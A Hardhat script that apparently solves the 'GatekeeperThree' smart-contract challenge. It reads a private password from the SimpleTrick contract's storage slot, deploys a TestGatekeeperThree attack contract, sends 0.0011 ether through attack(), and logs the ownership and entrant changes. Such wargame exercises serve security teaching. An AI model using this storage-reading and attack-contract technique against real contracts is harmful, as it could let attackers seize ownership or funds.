
const hre = require("hardhat");

async function main() {

    const [deployer, signer0, signer1] = await hre.ethers.getSigners();
    console.log(deployer.address, signer0.address, signer1.address);

    const contract = await hre.ethers.getContractAt("GatekeeperThree", "0xCA866bcb9cA7adfB6a7289996112653C1cA7f11a", signer0);
    // const contract = await hre.ethers.deployContract("GatekeeperThree", deployer);
    console.log("Contract deployed to address:", contract.address);
    console.log("Contract entrant:", await contract.entrant());

    // const txn1 = await contract.createTrick();
    // await txn1.wait();
    const trickContractAddress = await contract.trick();

    const trickContract = await hre.ethers.getContractAt("SimpleTrick", trickContractAddress, deployer);
    console.log("Trick contract deployed to address:", trickContract.address);
    const p0 =  await hre.ethers.provider.getStorageAt(trickContract.address, 0);
    const p1 =  await hre.ethers.provider.getStorageAt(trickContract.address, 1);
    const p2 =  ethers.BigNumber.from(await hre.ethers.provider.getStorageAt(trickContract.address, 2));

    console.log(p0, p1, p2);

    const testContractFactory = await hre.ethers.getContractFactory("TestGatekeeperThree", deployer);
    const testContract = await testContractFactory.deploy(contract.address, p2);
    console.log("Test contract deployed to:", testContract.address);
    const txn2 = await testContract.attack({
        value: hre.ethers.utils.parseEther("0.0011")
    })
    await txn2.wait();

    console.log("Contract owner:", await contract.owner());
    console.log("Contract allowEntrance:", await contract.allowEntrance());
    console.log("Contract balance:", await hre.ethers.provider.getBalance(contract.address));
    console.log("Test contract balance:", await hre.ethers.provider.getBalance(testContract.address));

    console.log("Contract entrant:", await contract.entrant());

}


main()
